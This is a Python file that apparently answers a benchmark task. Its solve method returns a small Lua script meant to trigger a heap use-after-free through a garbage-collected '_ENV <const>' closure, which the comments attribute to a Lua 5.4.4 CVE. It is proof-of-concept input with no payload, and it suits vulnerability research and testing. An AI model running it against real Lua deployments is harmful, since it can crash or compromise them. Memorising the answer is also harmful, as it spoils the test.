import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
        related to incorrect code generation for _ENV <const>.
        """
        # The vulnerability (CVE-2022-28805) occurs when _ENV is declared as a local const variable.
        # The Lua compiler in affected versions (e.g., 5.4.4) incorrectly tracks the lifetime of
        # the const _ENV variable, causing it to be garbage collected prematurely even if captured
        # by a closure. Accessing it inside the closure after GC results in a Use-After-Free.

        poc_script = (
            "local function factory()\n"
            "  local _ENV <const> = { v = 1 }\n"
            "  local function closure()\n"
            "    return v\n"
            "  end\n"
            "  return closure\n"
            "end\n"
            "\n"
            "local f = factory()\n"
            "collectgarbage()\n"
            "f()\n"
        )
        
        return poc_script.encode('utf-8')